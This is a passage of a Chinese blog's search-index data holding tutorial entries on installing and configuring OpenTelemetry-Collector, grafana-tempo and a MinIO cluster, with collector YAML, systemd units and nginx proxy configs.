","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","mimir","grafana"],"title":"grafana-mimir教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-mimir%E6%95%99%E7%A8%8B/#守护进程"},{"categories":["point"],"content":"OTLP 全称是 OpenTelemetry protocol OpenTelemetry 的传递协议. ","date":"2023-07-22","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/otlp/:0:0","series":null,"tags":["point","OTLP"],"title":"OTLP","uri":"/posts/%E7%AC%94%E8%AE%B0/point/otlp/#"},{"categories":["blog"],"content":"`OpenTelemetry-collector` 是 [[笔记/point/OpenTelemetry|OpenTelemetry]] 官方的数据采集软件. 它和 [[笔记/grafana-agent教程|grafana-agent]] 的功能有些类似.","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介OpenTelemetry-collector 是 OpenTelemetry 官方的数据采集软件. 它和 grafana-agent 的功能有些类似. ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 安装形式 直连: 优点 简单, 方便开发测试 上线不需要调整任何内容 缺点 改配置需要改动 app 代码 强耦合 每种开发语言处理起来都不一样 Agent 采集 优点 简单 1:1 处理数据的时候, 可以和 app/语言无关 如果用作 sidecar 很不错, 可以集成 OpenTelemetry-Collector 配置到代码库中, 在 CICD 的过程中使用 缺点 如果不采用 sidecar 模式, 扩展性不好 Gateway 采集 优点 负载均衡 集中管理证书的内容 缺点 复杂性 成本高 延迟高了, 性能差了 ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#安装形式"},{"categories":["blog"],"content":" 单点 agent 采集安装Getting Started | OpenTelemetry 有很多的安装方法, 我用 deb 安装包方便使用. wget https://github.com/open-telemetry/opentelemetry-collector-releases/releases/download/v0.88.0/otelcol_0.88.0_linux_amd64.deb dpkg -i otelcol_0.81.0_linux_amd64.deb # 启用 systemctl enable otelcol --now ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#单点-agent-采集安装"},{"categories":["blog"],"content":" 配置文件配置文件 /etc/otelcol/config.yaml,完整配置参考官网 Configuration | OpenTelemetry 因为采用了非标准的 grafana-loki 组件, 所以需要 自行编译 # 接收数据 # 接受prometheus,sdk等来源的数据.也可以是filelog采集本地日志文件 receivers: otlp: protocols: grpc: http: # 处理数据 processors: # batch可以帮助压缩整合数据 https://github.com/open-telemetry/opentelemetry-collector/blob/main/processor/batchprocessor/README.md batch: # 插入loki的标签 attributes: actions: - action: insert key: loki.attribute.labels value: log.file.name # 导出数据 exporters: # debug查看日志 logging: loglevel: debug # 推送数据到loki loki: endpoint: http://192.168.31.210:3100/loki/api/v1/push # 发送到mimir存储 prometheusremotewrite/mimir: endpoint: http://192.168.31.210:9009/api/v1/push # 发送给tempo, 注意这里是grpc.上面2个是http协议 otlp/tempo: endpoint: 192.168.31.210:3202 tls: insecure: true # 必须在下面配置才会生效 service: pipelines: traces: receivers: [otlp] processors: [batch] exporters: [logging,otlp/tempo] metrics: receivers: [otlp] processors: [batch] exporters: [logging,prometheusremotewrite/mimir] logs: receivers: [otlp] processors: [batch,attributes] exporters: [logging,loki] ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#配置文件"},{"categories":["blog"],"content":" 编译 opentelemetry-collector安装golang, 安装 构建工具builder GO111MODULE=on go install go.opentelemetry.io/collector/cmd/builder@latest 创建一个临时文件目录 mkdir oc-builder \u0026\u0026 cd oc-builder, 构建配置文件 oc-builder.yaml dist: name: otelcol-custom version: \"1.0.0\" description: Local OpenTelemetry Collector binary output_path: . exporters: - gomod: github.com/open-telemetry/opentelemetry-collector-contrib/exporter/lokiexporter v0.88.0 # 内置木块 https://pkg.go.dev/go.opentelemetry.io/collector/exporter@v0.81.0#section-directories - gomod: go.opentelemetry.io/collector/exporter/loggingexporter v0.88.0 - gomod: go.opentelemetry.io/collector/exporter/otlpexporter v0.88.0 - gomod: go.opentelemetry.io/collector/exporter/otlphttpexporter v0.88.0 - gomod: github.com/open-telemetry/opentelemetry-collector-contrib/exporter/prometheusexporter v0.88.0 - gomod: github.com/open-telemetry/opentelemetry-collector-contrib/exporter/prometheusremotewriteexporter v0.88.0 receivers: - gomod: go.opentelemetry.io/collector/receiver/otlpreceiver v0.88.0 processors: - gomod: go.opentelemetry.io/collector/processor/batchprocessor v0.88.0 - gomod: github.com/open-telemetry/opentelemetry-collector-contrib/processor/attributesprocessor v0.88.0 构建命令 builder --config=oc-builder.yaml [!warning] 如果构建报错说依赖有问题, 更新配置 ot-builder.yml 的 vXXX 版本号. 启动测试 ./otelcol-custom --config=/etc/otelcol/config.yaml otlpreceiver 默认 grpc 端口 4317, http 端口 4318. ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:4","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#编译-opentelemetry-collector"},{"categories":["blog"],"content":" 守护进程Systemd 守护进程配置 /etc/systemd/system/oc.service [Unit] Description=oc # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 #WorkingDirectory=/root/myApp/TestServer ExecStart=/root/oc-builder/otelcol-custom --config=/root/oc-builder/oc.yaml # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target #Alias=testserver.service ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:2:5","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#守护进程"},{"categories":["blog"],"content":" 有用的资料","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:3:0","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#有用的资料"},{"categories":["blog"],"content":" 负载均衡 exporterloadbalancingexporter 是一个负载均衡 exporter. 例如你的 grafana-mimir 有多个节点的时候, 就可以用上负载均衡来高性能, 高可用. ","date":"2023-07-21","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/:3:1","series":null,"tags":["blog","OpenTelemetry"],"title":"OpenTelemetry-Collector教程","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry-collector%E6%95%99%E7%A8%8B/#负载均衡-exporter"},{"categories":["blog"],"content":"这篇文章会把关于 [[笔记/point/OpenTelemetry|OpenTelemetry]] 的相关文章串联起来, 从 0 到 1 完成所有的实践.","date":"2023-07-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/","series":null,"tags":["blog","OpenTelemetry","grafana","prometheus","csharp"],"title":"OpenTelemetry实践","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/"},{"categories":["blog"],"content":" 简介这篇文章会把关于 OpenTelemetry 的相关文章串联起来, 从 0 到 1 完成所有的实践. 其中会涉及到如下组件, 搭建顺序是从下往上: APP代码放着这里,是 csharp-aspnetcore Web 应用 OpenTelemetry-Collector 接收应用数据 loki 处理日志 mimir 处理指标 tempo 处理链路追踪 minio 存放着所有的数据 grafana 做展示 ","date":"2023-07-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/:1:0","series":null,"tags":["blog","OpenTelemetry","grafana","prometheus","csharp"],"title":"OpenTelemetry实践","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/#简介"},{"categories":["blog"],"content":" 使用按照教程搭建完成以后, 应该有如下端口: 服务 地址 minio api 请求 minio-api.kentxxq.com, ui 操作 minio-ui.kentxxq.com loki 接收 oc 发送的日志数据 http_listen_port/3100, grpc_listen_port/3101 mimir 接收 oc 发送的指标数据 http_listen_port/9009, grpc_listen_port/9010 tempo 接收 oc 发送的追踪数据 http_listen_port/3200, distributor.receivers.otlp.http/3201, distributor.receivers.otlp.grpc/3202 opentelemetry-collector 接收应用数据 grpc/4317, http/4318 grafana-ui ui 操作 ip:3000 配置好 OC_Endpoint, 启动APP程序 即可在 grafana-ui 查询到数据. 日志数据: 链路数据: 指标数据: ","date":"2023-07-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/:2:0","series":null,"tags":["blog","OpenTelemetry","grafana","prometheus","csharp"],"title":"OpenTelemetry实践","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/#使用"},{"categories":["blog"],"content":" 相关内容 opentelemetry-collector 的配置文档 官方的OTLP Receiver log 处于 beta 阶段. Java 通过 agent 方式注入即可 opentelemetry-java-instrumentation 其他有用的信息 serilog-sinks-grafana-loki 可以直接发送日志到 loki ,http 接口的方式 loki 无法接受 otlp 协议日志 serilog-sinks-opentelemetry 通过 otlp 协议发送出去, 但是现在 loki 无法直接接收…. Grafana 的 agent, loki 无法支持 OTLP 收集日志 Support receiving logs in Loki using OpenTelemetry OTLP · Issue #5346 · grafana/loki · GitHub ","date":"2023-07-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/:3:0","series":null,"tags":["blog","OpenTelemetry","grafana","prometheus","csharp"],"title":"OpenTelemetry实践","uri":"/posts/%E7%AC%94%E8%AE%B0/opentelemetry%E5%AE%9E%E8%B7%B5/#相关内容"},{"categories":["point"],"content":"poc 是 Proof of Concept (概念验证) 的缩写. ","date":"2023-07-20","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/poc/:0:0","series":null,"tags":["point","poc"],"title":"poc","uri":"/posts/%E7%AC%94%E8%AE%B0/point/poc/#"},{"categories":["point"],"content":"elastic 是一个分布式搜索和分析引擎. 适用于搜索, 分析. AWS 开源了 OpenSearch,是 elastic 的分支. 因为 elastic 不允许云服务商使用它来提供服务. 要点: 免费 日志常用 ELK/EFK 中的 E 就是 elastic 分词搜索功能 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/elastic/:0:0","series":null,"tags":["point","elastic"],"title":"elastic","uri":"/posts/%E7%AC%94%E8%AE%B0/point/elastic/#"},{"categories":["blog"],"content":"grafana-tempo 是 [[笔记/point/grafana|grafana]] 公司的链路追踪组件","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介grafana-tempo 是 grafana 公司的链路追踪组件 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 下载 curl -Lo tempo_2.2.4_linux_amd64.tar.gz https://github.com/grafana/tempo/releases/download/v2.2.4/tempo_2.2.4_linux_amd64.tar.gz # 解压,得到可执行文件 tempo tar xf tempo_2.2.4_linux_amd64.tar.gz ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/#下载"},{"categories":["blog"],"content":" 配置文件配置示例 tempo.yaml server: http_listen_port: 3200 distributor: receivers: otlp: protocols: http: endpoint: 0.0.0.0:3201 grpc: endpoint: 0.0.0.0:3202 compactor: compaction: block_retention: 48h # configure total trace retention here #metrics_generator: # registry: # external_labels: # source: tempo # cluster: linux-microservices # storage: # path: /tmp/tempo/generator/wal # remote_write: # - url: http://localhost:9090/api/v1/write # send_exemplars: true storage: trace: backend: s3 s3: endpoint: minio-api.kentxxq.com bucket: tempo forcepathstyle: true #set to true if endpoint is https insecure: true access_key: # TODO - Add S3 access key secret_key: # TODO - Add S3 secret key wal: path: /tmp/tempo/wal # where to store the the wal locally local: path: /tmp/tempo/blocks overrides: metrics_generator_processors: [service-graphs, span-metrics] ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/#配置文件"},{"categories":["blog"],"content":" 守护进程Systemd 守护进程配置文件 /etc/systemd/system/tempo.service [Unit] Description=tempo # 启动区间30s内,尝试启动3次 StartLimitIntervalSec=30 StartLimitBurst=3 [Service] # 环境变量 $MY_ENV1 # Environment=MY_ENV1=value1 # Environment=\"MY_ENV2=value2\" # 环境变量文件,文件内容\"MY_ENV3=value3\" $MY_ENV3 # EnvironmentFile=/path/to/environment/file1 #WorkingDirectory=/root/myApp/TestServer ExecStart=/root/tempo -config.file=/root/tempo.yaml # 总是间隔30s重启,配合StartLimitIntervalSec实现无限重启 RestartSec=30s Restart=always # 相关资源都发送term后,后发送kill KillMode=mixed # 最大文件打开数不限制 LimitNOFILE=infinity # 子线程数量不限制 TasksMax=infinity [Install] WantedBy=multi-user.target #Alias=testserver.service ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/:2:3","series":null,"tags":["blog","tempo","grafana"],"title":"grafana-tempo教程","uri":"/posts/%E7%AC%94%E8%AE%B0/grafana-tempo%E6%95%99%E7%A8%8B/#守护进程"},{"categories":["point"],"content":"minio 是使用 golang 开发的对象存储服务. 要点: 开源免费 兼容 S3 协议, 社区庞大 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/point/minio/:0:0","series":null,"tags":["point","minio"],"title":"minio","uri":"/posts/%E7%AC%94%E8%AE%B0/point/minio/#"},{"categories":["blog"],"content":"[[笔记/point/minio|minio]] 的搭建和使用.","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/"},{"categories":["blog"],"content":" 简介minio 的搭建和使用. ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:1:0","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#简介"},{"categories":["blog"],"content":" 安装","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:0","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#安装"},{"categories":["blog"],"content":" 单机版 - 快速验证docker 版本: # 数据存在容器/data目录 # 端口 api接口/9000 ui操作/9001 # 默认 minioadmin/minioadmin docker run --rm -d \\ --name minio \\ -p 9000:9000 -p 9001:9001 \\ -e \"MINIO_ACCESS_KEY=admin\" -e \"MINIO_SECRET_KEY=admin\" \\ -v /data/minio/data:/data -v /data/minio/config:/root/.minio \\ minio/minio server /data --console-address \":9001\" 或者二进制版本: wget https://dl.min.io/server/minio/release/linux-amd64/minio chmod +x minio MINIO_ROOT_USER=admin MINIO_ROOT_PASSWORD=password ./minio server /mnt/data --console-address \":9001\" [!info] 官方快速验证文档地址 ","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:1","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#单机版---快速验证"},{"categories":["blog"],"content":" 集群部署 二进制安装我有 2 个机器。给每个节点加上一个 DNS 解析记录, 最好有统一的名称: minio1.kentxxq.com minio2.kentxxq.com 除了系统盘外，每个节点还有 2 个空的数据盘 (必须)。把数据盘挂载到系统 的 /mnt/minio{1,2} 目录 用户和目录准备: groupadd -r minio-user useradd -M -r -g minio-user minio-user # 模拟2个硬盘,2个节点 chown minio-user:minio-user /mnt/minio{1,2} 安装 minio, 官网安装页面 wget https://dl.min.io/server/minio/release/linux-amd64/minio chmod +x minio mv minio /usr/local/bin/ 环境配置文件 /etc/default/minio # 用户名和密码,集群之间是通过这个来校验的 MINIO_ROOT_USER=myminioadmin MINIO_ROOT_PASSWORD=minio-secret-key-change-me # api/9001 console-ui/9091 MINIO_OPTS=\"--address :9001 --console-address :9091\" # 2个节点互相发现,2个磁盘(除开系统盘) MINIO_VOLUMES=\"http://minio{1...2}.kentxxq.com:9000/mnt/minio{1...2}\" # 或者空格间隔 # MINIO_VOLUMES=\"http://minio1.kentxxq.com:9001/mnt/vdb1 http://minio2.kentxxq.com:9002/mnt/vdc1 http://minio3.kentxxq.com:9003/mnt/vdd1 http://minio4.kentxxq.com:9004/mnt/vde1\" # 请求地址 MINIO_SERVER_URL=\"https://minio-api.kentxxq.com\" MINIO_BROWSER_REDIRECT_URL=\"https://minio-ui.kentxxq.com\" 守护进程官方推荐 的 Systemd 守护配置存在位置 /etc/systemd/system/minio.service [Unit] Description=MinIO Documentation=https://min.io/docs/minio/linux/index.html Wants=network-online.target After=network-online.target AssertFileIsExecutable=/usr/local/bin/minio [Service] WorkingDirectory=/usr/local User=minio-user Group=minio-user ProtectProc=invisible EnvironmentFile=-/etc/default/minio ExecStartPre=/bin/bash -c \"if [ -z \\\"${MINIO_VOLUMES}\\\" ]; then echo \\\"Variable MINIO_VOLUMES not set in /etc/default/minio\\\"; exit 1; fi\" ExecStart=/usr/local/bin/minio server $MINIO_OPTS $MINIO_VOLUMES # MinIO RELEASE.2023-05-04T21-44-30Z adds support for Type=notify (https://www.freedesktop.org/software/systemd/man/systemd.service.html#Type=) # This may improve systemctl setups where other services use `After=minio.server` # Uncomment the line to enable the functionality # Type=notify # Let systemd restart this service always Restart=always # Specifies the maximum file descriptor number that can be opened by this process LimitNOFILE=65536 # Specifies the maximum number of threads this process can create TasksMax=infinity # Disable timeout logic and wait until process is stopped TimeoutStopSec=infinity SendSIGKILL=no [Install] WantedBy=multi-user.target # Built for ${project.name}-${project.version} (${project.name}) 启动 systemctl enable minio --now nginx 代理配置 upstream minio_s3 { least_conn; server 10.0.1.152:9001; server 10.0.1.152:9002; server 10.0.1.152:9003; server 10.0.1.152:9004; } upstream minio_console { least_conn; server 10.0.1.152:9091; server 10.0.1.152:9092; server 10.0.1.152:9093; server 10.0.1.152:9094; } server { listen 80; server_name minio-api.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-api.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; # Allow special characters in headers ignore_invalid_headers off; # Allow any size file to be uploaded. # Set to a value such as 1000m; to restrict file size to a specific value client_max_body_size 0; # Disable buffering proxy_buffering off; proxy_request_buffering off; location / { proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \"\"; chunked_transfer_encoding off; proxy_pass http://minio_s3; } } # ui server { listen 80; server_name minio-ui.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-ui.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#集群部署"},{"categories":["blog"],"content":" 集群部署 二进制安装我有 2 个机器。给每个节点加上一个 DNS 解析记录, 最好有统一的名称: minio1.kentxxq.com minio2.kentxxq.com 除了系统盘外，每个节点还有 2 个空的数据盘 (必须)。把数据盘挂载到系统 的 /mnt/minio{1,2} 目录 用户和目录准备: groupadd -r minio-user useradd -M -r -g minio-user minio-user # 模拟2个硬盘,2个节点 chown minio-user:minio-user /mnt/minio{1,2} 安装 minio, 官网安装页面 wget https://dl.min.io/server/minio/release/linux-amd64/minio chmod +x minio mv minio /usr/local/bin/ 环境配置文件 /etc/default/minio # 用户名和密码,集群之间是通过这个来校验的 MINIO_ROOT_USER=myminioadmin MINIO_ROOT_PASSWORD=minio-secret-key-change-me # api/9001 console-ui/9091 MINIO_OPTS=\"--address :9001 --console-address :9091\" # 2个节点互相发现,2个磁盘(除开系统盘) MINIO_VOLUMES=\"http://minio{1...2}.kentxxq.com:9000/mnt/minio{1...2}\" # 或者空格间隔 # MINIO_VOLUMES=\"http://minio1.kentxxq.com:9001/mnt/vdb1 http://minio2.kentxxq.com:9002/mnt/vdc1 http://minio3.kentxxq.com:9003/mnt/vdd1 http://minio4.kentxxq.com:9004/mnt/vde1\" # 请求地址 MINIO_SERVER_URL=\"https://minio-api.kentxxq.com\" MINIO_BROWSER_REDIRECT_URL=\"https://minio-ui.kentxxq.com\" 守护进程官方推荐 的 Systemd 守护配置存在位置 /etc/systemd/system/minio.service [Unit] Description=MinIO Documentation=https://min.io/docs/minio/linux/index.html Wants=network-online.target After=network-online.target AssertFileIsExecutable=/usr/local/bin/minio [Service] WorkingDirectory=/usr/local User=minio-user Group=minio-user ProtectProc=invisible EnvironmentFile=-/etc/default/minio ExecStartPre=/bin/bash -c \"if [ -z \\\"${MINIO_VOLUMES}\\\" ]; then echo \\\"Variable MINIO_VOLUMES not set in /etc/default/minio\\\"; exit 1; fi\" ExecStart=/usr/local/bin/minio server $MINIO_OPTS $MINIO_VOLUMES # MinIO RELEASE.2023-05-04T21-44-30Z adds support for Type=notify (https://www.freedesktop.org/software/systemd/man/systemd.service.html#Type=) # This may improve systemctl setups where other services use `After=minio.server` # Uncomment the line to enable the functionality # Type=notify # Let systemd restart this service always Restart=always # Specifies the maximum file descriptor number that can be opened by this process LimitNOFILE=65536 # Specifies the maximum number of threads this process can create TasksMax=infinity # Disable timeout logic and wait until process is stopped TimeoutStopSec=infinity SendSIGKILL=no [Install] WantedBy=multi-user.target # Built for ${project.name}-${project.version} (${project.name}) 启动 systemctl enable minio --now nginx 代理配置 upstream minio_s3 { least_conn; server 10.0.1.152:9001; server 10.0.1.152:9002; server 10.0.1.152:9003; server 10.0.1.152:9004; } upstream minio_console { least_conn; server 10.0.1.152:9091; server 10.0.1.152:9092; server 10.0.1.152:9093; server 10.0.1.152:9094; } server { listen 80; server_name minio-api.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-api.kentxxq.com; include /usr/local/nginx/conf/options/ssl_kentxxq.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-api.kentxxq.com.log k-json; # Allow special characters in headers ignore_invalid_headers off; # Allow any size file to be uploaded. # Set to a value such as 1000m; to restrict file size to a specific value client_max_body_size 0; # Disable buffering proxy_buffering off; proxy_request_buffering off; location / { proxy_set_header Host $http_host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Forwarded-Proto $scheme; proxy_connect_timeout 300; # Default is HTTP/1, keepalive is only enabled in HTTP/1.1 proxy_http_version 1.1; proxy_set_header Connection \"\"; chunked_transfer_encoding off; proxy_pass http://minio_s3; } } # ui server { listen 80; server_name minio-ui.kentxxq.com; return 301 https://$server_name$request_uri; include /usr/local/nginx/conf/options/normal.conf; access_log /usr/local/nginx/conf/hosts/logs/minio-ui.kentxxq.com.log k-json; } server { http2 on; listen 443 ssl; server_name minio-","date":"2023-07-19","objectID":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/:2:2","series":null,"tags":["blog","minio"],"title":"minio教程","uri":"/posts/%E7%AC%94%E8%AE%B0/minio%E6%95%99%E7%A8%8B/#二进制安装"},{"categories":["blog"],"content":" 集群部署 二进制安装我有 2 个机器。给每个节点加上一个 DNS 解析记录, 最好有统一的名称: minio1.kentxxq.com minio2.kentxxq.com 除了系统盘外，每个节点还有 2 个空的数据盘 (必须)。把数据盘挂载到系统 的 /mnt/minio{1,2} 目录 用户和目录准备: groupadd -r minio-user useradd -M -r -g minio-user minio-user # 模拟2个硬盘,2个节点 chown minio-user:minio-user /mnt/minio{1,2} 安装 minio, 官网安装页面 wget https://dl.min.io/server/minio/release/linux-amd64/minio chmod +x minio mv minio /usr/local/bin/ 环境配置文件 /etc/default/minio # 用户名和密码,集群之间是通过这个来校验的 MINIO_ROOT_USER=myminioadmin MINIO_ROOT_PASSWORD=minio-secret-key-change-me # api/9001 console-ui/9091 MINIO_OPTS=\"--address :9001 --console-address :9091\" # 2个节点互相发现,2个磁盘(除开系统盘) MINIO_VOLUMES=\"http://minio{1...2}.kentxxq.com:9000/mnt/minio{1...2}\" # 或者空格间隔 # MINIO_VOLUMES=\"http://minio1.kentxxq.com:9001/mnt/vdb1 http://minio2.kentxxq.com:9002/mnt/vdc1 http://minio3.kentxxq.com:9003/mnt/vdd1 http://minio4.kentxxq.com:9004/mnt/vde1\" # 请求地址 MINIO_SERVER_URL=\"https://minio-api.kentxxq.com\" MINIO_BROWSER_REDIRECT_URL=\"https://minio-ui.kentxxq.com\" 守护进程官方推荐 的 Systemd 守护配置存在位置 /etc/systemd/system/minio.service [Unit] Description=MinIO Documentation=https://min.io/docs/minio/linux/index.html Wants=network-online.target After=network-online.target AssertFileIsExecutable=/usr/local/bin/minio [Service] WorkingDirectory=/usr/local User=minio-user Group=minio-user ProtectProc=invisible EnvironmentFile=-/etc/default/minio ExecStartPre=/bin/bash -c \"if [ -z \\\"${MINIO_VOLUMES}\\\" ]; then echo \\\"Variable MINIO_VOLUMES not set in /etc/default/minio\\\"; exit 1; fi\" ExecStart=/usr/local/bin/minio server $MINIO_OPTS $MINIO_VOLUMES # MinIO RELEASE.2023-05-04T21-44-30Z adds support for Type=notify (https://www.freedesktop.org/software/systemd/man/systemd.service.html#Type=) # This may improve systemctl setups where other services use `After=minio.server` # Uncomment the line to enable the functionality # Type=notify # 